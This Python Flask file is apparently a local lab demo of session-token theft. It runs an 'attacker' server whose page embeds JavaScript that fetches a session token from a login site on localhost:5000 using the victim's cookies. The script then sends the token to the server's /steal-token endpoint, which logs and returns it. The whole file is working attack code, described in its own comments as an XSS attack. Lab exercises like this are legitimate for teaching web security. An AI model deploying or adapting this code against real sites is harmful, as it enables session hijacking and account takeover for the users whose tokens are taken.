from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

app.config['SESSION_COOKIE_SAMESITE'] = 'None' # Allow cross-site cookie access
app.config['SESSION_COOKIE_SECURE'] = False # Disable secure cookies for local testing

# Endpoint to steal the session token
@app.route('/steal-token', methods=['GET'])
def steal_token():
    token = request.args.get('token')
    print(f"Stolen Session Token: {token}")
    return jsonify({"message": "Token stolen!", "stolen_token": token})

@app.route('/')
def inject_xss():
    return '''
        <h1>Attacker's Page</h1>
        <p id="stolen-token">Stealing session token...</p>
        <script>
            console.log('Starting XSS attack...');

            // Automatically execute JavaScript to steal the session token from the login site
                fetch('http://localhost:5000/session-token', {
                    method: 'GET',
                    credentials: 'include'  // Ensure cookies are included in the request
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Failed to fetch session token');
                    }
                    console.log('Session token endpoint hit successfully');
                    return response.json();
                })
                .then(data => {
                    console.log('Session token received:', data.session_token);

                    // Send the session token to the attacker's steal-token endpoint
                    return fetch('http://localhost:5001/steal-token?token=' + data.session_token);
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Failed to send session token to attacker');
                    }
                    console.log('Session token sent to attacker');
                    return response.json();
                })
                .then(data => {
                    // Display the stolen session token on the attacker's page
                    document.getElementById('stolen-token').textContent = 'Stolen Session Token: ' + data.stolen_token;
                    console.log('Stolen token displayed on page:', data.stolen_token);
                })
                .catch(error => {
                    console.error('Error in XSS attack:', error);
                    document.getElementById('stolen-token').textContent = 'Error: ' + error.message;
                });
        </script>
    '''

if __name__ == '__main__':
    app.run(debug=True, port=5001)
